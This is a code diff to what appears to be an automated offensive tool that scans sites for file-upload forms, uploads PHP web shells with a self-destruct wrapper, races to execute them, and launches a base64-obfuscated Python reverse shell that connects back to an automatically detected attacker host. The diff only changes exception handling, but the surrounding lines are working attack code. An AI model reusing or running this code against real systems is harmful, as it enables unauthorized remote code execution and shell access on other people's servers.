@@ -39,7 +39,7 @@ try:
     base_shell = WebShellGenerator.generate_webshell("php", "lockon")
     # 2. Add Self-Destruct (Ghost Protocol)
     gen_shell = GhostProtocol.wrap_self_destruct(base_shell, "php").encode()
-except: 
+except Exception:
     gen_shell = PHP_SMART_SHELL
 
 for ext in DANGEROUS_EXTS:
@@ -64,7 +64,7 @@ def get_target_ip(url):
         hostname = urlparse(url).hostname
         if hostname in ["localhost", "127.0.0.1"]: return "127.0.0.1"
         return socket.gethostbyname(hostname)
-    except: return "127.0.0.1"
+    except Exception: return "127.0.0.1"
 
 # [FIX] Smart LHOST: เชื่อมต่อกับ Target IP เพื่อหา Interface ที่ถูกต้อง
 # แก้ปัญหา VPN Routing (ยิง VM ผ่าน Local LAN แต่ได้ IP VPN มาแทน)
@@ -77,7 +77,7 @@ def get_lhost(target_ip):
         ip = s.getsockname()[0]
         s.close()
         return ip
-    except:
+    except Exception:
         # Fallback ถ้าต่อ Target ไม่ได้ (เช่นโดนบล็อก ping) ก็ลอง 8.8.8.8
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -85,7 +85,7 @@ def get_lhost(target_ip):
             ip = s.getsockname()[0]
             s.close()
             return ip
-        except:
+        except Exception:
             return "127.0.0.1"
 
 async def trigger_reverse_shell(session, shell_url, lhost, lport, os_type="linux"):
@@ -108,7 +108,7 @@ try:
     s.connect(("{lhost}",{lport}))
     os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
     subprocess.call(["/bin/sh","-i"])
-except: pass
+except Exception: pass
 """
         b64_linux = base64.b64encode(py_code_linux.encode()).decode()
         rev_payloads.append(f"python3 -c \"exec(__import__('base64').b64decode('{b64_linux}'))\"")
@@ -117,7 +117,7 @@ except: pass
         try:
             await session.get(f"{shell_url}?c={cmd}", ssl=False)
             await asyncio.sleep(0.5)
-        except: pass
+        except Exception: pass
 
 async def race_check(session, url, payload_name):
     possible_dirs = ["uploads/", "images/", "files/", ""]
@@ -128,7 +128,7 @@ async def race_check(session, url, payload_name):
         for target in attempts:
             try:
                 await session.get(f"{target}?c=echo LOCKON_RACE_WIN", ssl=False)
-            except: pass
+            except Exception: pass
         await asyncio.sleep(0.1)
 
 async def check_upload_rce(session, url, form_details):
@@ -188,7 +188,7 @@ async def check_upload_rce(session, url, form_details):
                                                 async with session.get(exec_url, timeout=5, ssl=False) as cmd_resp:
                                                     out = (await cmd_resp.text()).strip()[:200]
                                                     if "Microsoft Windows" in out: detected_os = "windows"
-                                            except: pass
+                                            except Exception: pass
                                         
                                         # บันทึก Finding
                                         findings.append({
@@ -201,12 +201,12 @@ async def check_upload_rce(session, url, form_details):
                                             "exploit_data": {"shell_url": shell_url, "os_type": detected_os}
                                         })
                                         return findings 
-                            except: pass
+                            except Exception: pass
             
                 # Ensure race task completes before leaving session scope
                 if not race_task.done(): 
                     await race_task
-            except: pass
+            except Exception: pass
             
     return findings
 
@@ -264,7 +264,7 @@ async def run_upload_scan(target_url, crawled_urls, log_callback=None, headers=N
                 async with session.get(url, timeout=5, ssl=False) as resp:
                     text = await resp.text()
                     if 'type="file"' in text: upload_pages.append(url)
-            except: pass
+            except Exception: pass
             
     if not upload_pages: return findings
     if log_callback: log_callback(f"   Found {len(upload_pages)} upload forms. Trying Smart RCE...")
@@ -285,5 +285,5 @@ async def run_upload_scan(target_url, crawled_urls, log_callback=None, headers=N
                         res = await check_upload_rce(session, url, details)
                         findings.extend(res)
                         if res and log_callback: return findings 
-            except: pass
+            except Exception: pass
     return findings
